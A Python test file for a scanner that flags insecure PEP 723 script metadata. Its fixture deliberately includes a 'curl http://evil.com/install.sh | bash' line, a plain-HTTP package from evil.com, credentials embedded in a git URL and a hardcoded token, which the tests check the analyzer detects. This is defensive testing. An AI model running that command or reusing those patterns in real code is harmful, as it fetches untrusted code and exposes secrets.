"""Tests for Pep723Analyzer."""

from pathlib import Path

from devai.pep723_analyzer import Pep723Analyzer, Pep723Finding


INSECURE_SCRIPT = '''\
# /// script
# requires-python = ">=3.11"
# dependencies = [
#   "requests @ git+https://user:pass@github.com/org/pkg.git@main",
#   "tool @ http://evil.com/pkg.whl",
#   "wildcard==*",
# ]
# API_KEY = "hardcoded-secret-token-12345"
# run = "curl http://evil.com/install.sh | bash"
# ///

def main():
    print("hello")
'''

HARDENED_SCRIPT = '''\
# /// script
# requires-python = ">=3.11"
# dependencies = [
#   "requests==2.32.3",
#   "httpx==0.27.0",
# ]
# ///

def main():
    print("hello")
'''


class TestPep723Analyzer:
    def test_detects_insecure_block(self, tmp_path: Path):
        (tmp_path / "deploy.py").write_text(INSECURE_SCRIPT, encoding="utf-8")
        analyzer = Pep723Analyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "scm_credentials" in kinds
        assert "insecure_http" in kinds
        assert "unpinned_git_ref" in kinds
        assert "curl_pipe_shell" in kinds
        assert "wildcard_version" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_block_clean(self, tmp_path: Path):
        (tmp_path / "tool.py").write_text(HARDENED_SCRIPT, encoding="utf-8")
        analyzer = Pep723Analyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert findings == []
        assert analyzer.health_score() == 100.0
        assert len(analyzer.infos) == 1
        assert analyzer.infos[0].dependencies == ["requests==2.32.3", "httpx==0.27.0"]

    def test_no_scripts_returns_full_score(self, tmp_path: Path):
        (tmp_path / "plain.py").write_text("x = 1\n", encoding="utf-8")
        analyzer = Pep723Analyzer(str(tmp_path))
        assert analyzer.analyze() == []
        assert analyzer.health_score() == 100.0
        assert "none found" in analyzer.summary()

    def test_scripts_discovery(self, tmp_path: Path):
        (tmp_path / "a.py").write_text(HARDENED_SCRIPT, encoding="utf-8")
        (tmp_path / "b.py").write_text("pass\n", encoding="utf-8")
        analyzer = Pep723Analyzer(str(tmp_path))
        assert len(analyzer.scripts()) == 1

    def test_to_context_includes_findings(self, tmp_path: Path):
        (tmp_path / "deploy.py").write_text(INSECURE_SCRIPT, encoding="utf-8")
        analyzer = Pep723Analyzer(str(tmp_path))
        ctx = analyzer.to_context()
        assert "PEP 723" in ctx
        assert "hardcoded_secret" in ctx or "[high]" in ctx

    def test_generate_hardened_block(self):
        block = Pep723Analyzer(".").generate_hardened_block()
        assert "# /// script" in block
        assert "requests==" in block

    def test_finding_format(self):
        finding = Pep723Finding(
            kind="test",
            severity="high",
            message="example",
            path="x.py",
            lineno=1,
        )
        assert "[high] x.py:1" in finding.format()
